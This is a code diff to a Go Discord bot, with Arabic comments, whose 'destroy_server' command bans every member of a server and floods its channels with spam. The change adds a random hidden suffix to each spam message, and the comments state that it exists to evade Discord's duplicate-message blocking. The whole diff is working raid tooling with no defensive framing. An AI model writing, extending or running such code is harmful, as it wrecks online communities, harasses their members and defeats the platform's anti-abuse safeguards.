@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"math/rand"
 	"net/http"
 	"os"
 	"os/signal"
@@ -36,7 +37,7 @@ func main() {
 	cmdName := "destroy_server"
 	command := &discordgo.ApplicationCommand{
 		Name:        cmdName,
-		Description: "أمر تدمير السيرفر (سرعة صاروخية - باند لكل الأعضاء وسبام مباشر)",
+		Description: "أمر تدمير السيرفر (بسرعة صاروخية وتخطي حظر تكرار الرسائل)",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -81,7 +82,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري تدمير السيرفر وباند كل الأعضاء بأقصى سرعة...",
+					Content: "🚀 جاري تدمير السيرفر وإرسال السبام بترميز فريد لتجاوز الحظر...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -159,7 +160,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		}
 	}()
 
-	// 2. جلب وباند جميع الأعضاء بالكامل مهما بلغ عددهم (باستخدام التكرار لجلب الكل)
+	// 2. جلب وباند جميع الأعضاء بالكامل
 	go func() {
 		var userIDs []string
 		lastID := "0"
@@ -197,7 +198,6 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 			}
 		}
 
-		// تنفيذ الباند على دفعات سريعة
 		batchSize := 50
 		for i := 0; i < len(userIDs); i += batchSize {
 			end := i + batchSize
@@ -266,7 +266,8 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		time.Sleep(40 * time.Millisecond)
 	}
 
-	// 4. إرسال الرسائل مباشرة عبر البوت وبأقصى سرعة
+	// 4. إرسال الرسائل مع الرمز العشوائي الفريد لكل رسالة لتخطي الحظر بالكامل
+	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	for i := 0; i < len(channelIDs); i += groupSize {
 		end := i + groupSize
 		if end > len(channelIDs) {
@@ -276,7 +277,11 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		for _, chID := range channelIDs[i:end] {
 			go func(cID string) {
 				for m := 0; m < messagesCount; m++ {
-					msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
+					// إضافة رمز عشوائي فريد لكل رسالة لتجنب الحظر الصامت من ديسكورد
+					uniqueSuffix := fmt.Sprintf(" ||`[%d-%d]`||", rng.Intn(999999), m)
+					finalMsg := messageContent + uniqueSuffix
+
+					msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
 					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
 					for k, v := range headers {
 						msgReq.Header.Set(k, v)
